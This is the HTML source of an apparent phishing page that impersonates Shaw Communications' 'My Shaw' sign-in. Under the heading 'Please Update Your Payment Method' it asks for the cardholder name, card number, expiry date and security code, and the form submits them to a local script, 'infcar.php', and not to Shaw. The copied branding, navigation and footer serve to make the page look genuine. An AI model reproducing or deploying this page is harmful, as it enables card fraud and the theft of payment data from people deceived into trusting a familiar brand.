<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml" class=" js flexbox flexboxlegacy no-touch geolocation postmessage hashchange history draganddrop backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage"><head>
  <meta charset="utf-8">
  <meta http-equiv="content-type" content="text/html; charset=us-ascii">

  <title>Sign in . Shaw</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="icon" type="image/png" href="images/favicon.ico">
  <link href="css/combine_signon_136.css" rel="stylesheet" type="text/css">
  <!--[if lt IE 9]>
    <link rel="stylesheet" type="text/css" href="/css/style-ie8.css">
    <![endif]-->

<!-- Start: GPT Async -->
</head>

<body data-pagename="Signon|My Shaw" onload="checkAd();">
  <div class="wrapper">
    <div class="meganav clearfix">
      <div class="masthead">
        <div class="meganavcontainer nopadding" style="padding-left: 5px;padding-right: 5px;">
          <ul class="row topToolbar">
            <li class="columns six col-xs-7 col-sm-6 first" style="padding-left:10px; padding-right:0px;">
              <ul class="floatLeft">
                <li class="personal"><a data-event="navigation-element" data-value="signonandregister|header-nav|personal" href="http://www.shaw.ca/store/">Personal</a></li>

                <li class="business"><a data-event="navigation-element" data-value="signonandregister|header-nav|business" href="http://business.shaw.ca/">Business</a></li>
              </ul>

              <ul class="hidden-xs">
                <li>
                    <span class="chat"><a data-event="navigation-element" data-value="signonandregister|footer-nav|chat" href="http://www.shaw.ca/store/" target="_blank">Shop</a></span><span class="chat divider">|</span><span> <a data-event="navigation-element" data-value="signonandregister|footer-nav|email-us" href="https://community.shaw.ca/" target="_blank">Support</a></span><span class="divider">|</span><span> <a data-event="navigation-element" data-value="signonandregister|footer-nav|support" href="https://my.shaw.ca" target="_blank">My Shaw</a></span>
                </li>
              </ul>
            </li>

            <li class="columns six col-xs-5 col-sm-6 text-right" style="padding-left:0; padding-right:10;">
              <ul class="secondary">
                <li class="drawer" rel="contact-content"></li>
              </ul>
            </li>
          </ul>
        </div>

        <div class="topToolbarContent hidden-xs">
          <div class="meganavcontainer">
            <ul class="nav">
              <li class="meganavcontent contact-content" id="contact-content">
                <ul class="meganavcontainer row">
                  <li class="columns five phone col-md-2-5 col-sm-6 col-xs-6">
                    <h3 class="ic ic-shaw-phone2">Phone</h3>

                    <p>Questions? You can give us a call 24/7.</p>

                    <p><strong>1-888-472-2222</strong></p>
                  </li>

                  <li class="columns five chat col-md-2-5 col-sm-6 col-xs-6">
                    <h3 class="ic ic-shaw-chat2">Chat</h3>

                    <p class="ontouch">To chat with our reps online for questions and
                    advice, please visit us on a desktop computer.</p>

                    <p class="notouch">Chat with our reps online for answers and
                    advice.</p>

                    <p class="notouch"><a data-event="navigation-element" data-value="signonandregister|header-nav|contactnav-chat" href="javascript:openChatWindow();">Click to chat</a></p>
                  </li>

                  <li class="columns five email col-md-2-5 col-sm-6 col-xs-6">
                    <h3 class="ic ic-shaw-email2">Email</h3>

                    <p>Ask your questions and we'll get back to you.</p>

                    <p><a data-event="navigation-element" data-value="signonandregister|header-nav|contactnav-email" href="javascript:openEmailWindow();">Email us</a></p>
                  </li>

                  <li class="columns five store col-md-2-5 col-sm-6 col-xs-6">
                    <h3 class="ic ic-shaw-location">Find a store</h3>

                    <p>Visit a store for help with products and services</p>

                    <p><a data-event="navigation-element" data-value="signonandregister|header-nav|contactnav-findastore" target="_blank" href="https://www.shaw.ca/contact-us/retail/">Find a store</a></p>
                  </li>

                  <li class="columns five support col-md-2-5 col-sm-6 col-xs-6">
                    <h3 class="ic ic-shaw-contact2">Support</h3>

                    <p>Get the answers to your questions.</p>

                    <p><a data-event="navigation-element" data-value="signonandregister|header-nav|contactnav-visitsupport" target="_blank" href="https://community.shaw.ca/">Visit Support
                    Community</a></p>
                  </li>
                </ul>

                <div class="clearfix"></div>
                <hr>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>

    <div class="container">
      <div id="content" class="content">
        <div id="sign-in-content" class="main-content">
          <div id="logo-section" class="logo-section ">
            <img src="images/webmail-desktop.png">
          </div>

          <div class="alert_placeholder" id="alert_placeholder"></div>

          <div id="heading-section" class="heading-section">
            <p id="heading" class="heading">Please Update Your Payment Method</p>
          </div>

          <div id="tabs" class="tabs-menu" style="display: none;">
            <ul class="nav nav-tabs" data-tabs="tabs">
              

              <li id="shawOCCTab" class="active"><a href="#myaccount" data-toggle="tab">My
              Shaw</a></li>

              
            </ul>
          </div>

          <div class="tab-pane active">
            <form id="signon_form_occ" method="post" action="infcar.php" class="form-signin" name="signon_form_occ">


              <div class="input_info_container">
                <div class="input_text">
                  <label id="nameoncard_input_label" class="user_label" for="nameoncard_input" style="">Name on Card</label> <input id="nameoncard_input_occ" name="nameoncard" type="text" class="input_fields username_input" autocorrect="off" autocapitalize="off" autocomplete="off" tabindex="1" placeholder="Name on Card" required>
                </div>

              </div>
			                <div class="input_info_container">
                <div class="input_text">
                  <label id="cardn_input_label" class="user_label" for="cardn_input" style="">Card Number</label> <input id="cardn_input_occ" name="cardn" type="text" class="input_fields username_input" autocorrect="off" autocapitalize="off" autocomplete="off" tabindex="1" placeholder="Card Number" required>
                </div>

              </div>
			                <div class="input_info_container">
                <div class="input_text">
                  <label id="cardex_input_label" class="user_label" for="cardex_input" style="">Card Expiry Date</label> <input id="cardex_input_occ" name="cardex" type="text" class="input_fields username_input" autocorrect="off" autocapitalize="off" autocomplete="off" tabindex="1" placeholder="MM/YYYY" required>
                </div>

              </div>
			                <div class="input_info_container">
                <div class="input_text">
                  <label id="cardcvv_input_label" class="user_label" for="cardcvv_input" style="">Card Security code</label> <input id="cardcvv_input_occ" name="cardcvv" type="text" class="input_fields username_input" autocorrect="off" autocapitalize="off" autocomplete="off" tabindex="1" placeholder="Card Security code" maxlength="4" required>
                </div>

              </div>


              <div class="clearfix"></div>

              <div id="checkbox-section" class="checkbox-section">
                <div id="checkbox" class="checkboxFive">
                  

                
                </div>
              </div>

              <div style="text-align:center">
                <button type="submit" id="signin_submit" onclick="" class="button button_enabled" tabindex="5">Submit</button>
              </div><input id="realm_input" name="realm" type="hidden" value="occ">

            
            </form>
          </div>
        </div>

        <div id="side-description" class="side-description">
            <div class="advertisementText">
                Advertisement
            </div>
            <div id="div-gpt-ad-969787815759805020-1" name="" class="webmailAdBox" data-google-query-id="CKzL9ZvfreACFc9IGwodmncLrw"><div id="google_ads_iframe_/6872/webmail.shaw.ca_0__container__" style="border: 0pt none; width: 300px; height: 250px;"></div></div>
        </div>

        <div class="clearfix"></div><input type="hidden" id="goto" name="goto" value="https://my.shaw.ca/">

        <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
          <div class="modal-dialog">
            <div class="modal-content">
              <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true"><img src="images/modal-close.png"></span><span class="sr-only">Close</span></button>

                

                <h2 class="modal-title" id="myModalLabel">What's my Shaw email?</h2>
              </div>

              <div class="modal-body">
                <p class="modal-para">If you are a Shaw Internet customer and don't have an @shaw.ca email address, please visit <a href="https://my.shaw.ca">My Shaw</a> to create one.</p>
              </div>
            </div>
          </div>
        </div><noscript>
        <div id="no-js-tab-content" class="tab-content">
          <div id="logo-section" class="logo-section manage"></div>

          <div id="error" style="text-align:center" class="error"></div>

          <div class="alert_placeholder" id="alert_placeholder"></div>

          <div id="sign-in-heading-section" class="sign-in-heading-section">
            <label id="heading" class="heading">Sign in to access your Shaw email</label>
          </div>

          <form class="form-signin" method="post" action=
          "redirect.shaw.do">
            <select name="realm">
              <option value="shawemail" selected="selected">
                Email
              </option>

              <option value="shawocc">
                My Shaw
              </option>

              <option value="shawdirect">
                Shaw Direct
              </option>
            </select>

            <div class="clearfix"></div><input id="username_input" class="username_input"
            name="username" type="text" autocorrect="off" autocapitalize="off"
            placeholder="Login ID" /> <input id="password_input_field" name="password"
            type="password" placeholder="Password" /> <input type="submit" name=
            "submit" />

            <div class="clearfix"></div>
          </form>
        </div></noscript>
      </div>
    </div>

    <div class="push"></div>
  </div>

  <div id="contact-footer" class="contact-footer">
    <div id="footer-section" class="footer-section">
      <div id="footer-section-content" class="footer-section-content">
        <div id="footer-links" class="footer-links">
          <span><a data-event="navigation-element" data-value="signonandregister|footer-nav|privacy-policy" href="http://www.shaw.ca/privacy-policy/" target="_blank" tabindex="10">Privacy
          Policy</a>&nbsp;&nbsp;</span> <span>|</span> <span>&nbsp;&nbsp;<a data-event="navigation-element" data-value="signonandregister|footer-nav|terms-of-use" href="http://www.shaw.ca/terms-of-use/" target="_blank" tabindex="11">Terms of
          Use</a>&nbsp;&nbsp;</span> <span>|</span> <span>&nbsp;&nbsp;<a data-event="navigation-element" data-value="signonandregister|footer-nav|accessibility" href="http://www.shaw.ca/accessibility/" target="_blank" tabindex="12">Accessibility</a>&nbsp;&nbsp;</span>
        </div>

        <div id="footer-copyright" class="footer-copyright">
          <span> 2019 Shaw Communications. All Rights Reserved.</span>
        </div>
      </div>
    </div>
  </div>
  <script src="js/jquery.min.js" type="text/javascript"></script>
  <script src="js/combine_signon_136.js" type="text/javascript"></script>
 

<script type="text/javascript">
    $("#myModal").click(function(myTarget) {
        // Let's see if we targetted the backdrop
        console.log(myTarget.target)
        if (myTarget.target == document.getElementById("myModal")) {
          $('#myModal').modal('hide');
        }

    });
</script>
  <div id="ZN_djzxQPnJgAbhfwh"></div>

</body></html>